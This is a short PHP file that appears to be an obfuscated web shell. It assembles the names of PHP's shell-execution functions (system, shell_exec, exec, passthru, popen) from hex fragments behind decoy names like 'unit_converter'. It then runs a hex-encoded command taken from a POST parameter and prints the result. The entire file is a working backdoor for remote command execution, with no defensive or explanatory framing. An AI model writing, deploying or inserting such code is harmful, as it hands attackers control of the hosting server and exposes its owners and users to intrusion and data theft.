<?php


$mrk1 = '74';
$mrk2 = '65';
$mrk3 = '6d';
$mrk4 = '68';
$mrk5 = '6c';
$mrk6 = '63';
$mrk7 = '78';
$mrk8 = '73';
$mrk9 = '72';
$mrk10 = '70';
$mrk11 = '6e';
$mrk12 = '6f';
$mrk13 = '76';
$mrk14 = '5f';
$unit_converter1 = pack("H*", '73'.'79'.'73'.$mrk1.$mrk2.$mrk3);
$unit_converter2 = pack("H*", '73'.$mrk4.$mrk2.'6c'.$mrk5.'5f'.$mrk2.'78'.'65'.$mrk6);
$unit_converter3 = pack("H*", $mrk2.$mrk7.$mrk2.$mrk6);
$unit_converter4 = pack("H*", '70'.'61'.$mrk8.$mrk8.$mrk1.$mrk4.$mrk9.'75');
$unit_converter5 = pack("H*", $mrk10.'6f'.'70'.$mrk2.$mrk11);
$unit_converter6 = pack("H*", '73'.'74'.$mrk9.$mrk2.'61'.$mrk3.'5f'.'67'.$mrk2.$mrk1.'5f'.$mrk6.'6f'.'6e'.$mrk1.$mrk2.$mrk11.'74'.'73');
$unit_converter7 = pack("H*", $mrk10.'63'.'6c'.$mrk12.$mrk8.$mrk2);
$reverse_searcher = pack("H*", $mrk9.'65'.$mrk13.$mrk2.'72'.'73'.$mrk2.$mrk14.$mrk8.$mrk2.'61'.'72'.$mrk6.$mrk4.$mrk2.$mrk9);
if (isset($_POST[$reverse_searcher])) {
    $reverse_searcher = pack("H*", $_POST[$reverse_searcher]);
    if (function_exists($unit_converter1)) {
        $unit_converter1($reverse_searcher);
    } elseif (function_exists($unit_converter2)) {
        print $unit_converter2($reverse_searcher);
    } elseif (function_exists($unit_converter3)) {
        $unit_converter3($reverse_searcher, $rec_pset);
        print join("\n", $rec_pset);
    } elseif (function_exists($unit_converter4)) {
        $unit_converter4($reverse_searcher);
    } elseif (function_exists($unit_converter5) && function_exists($unit_converter6) && function_exists($unit_converter7)) {
        $descriptor_value = $unit_converter5($reverse_searcher, 'r');
        if ($descriptor_value) {
            $property_set_data = $unit_converter6($descriptor_value);
            $unit_converter7($descriptor_value);
            print $property_set_data;
        }
    }
    exit;
}
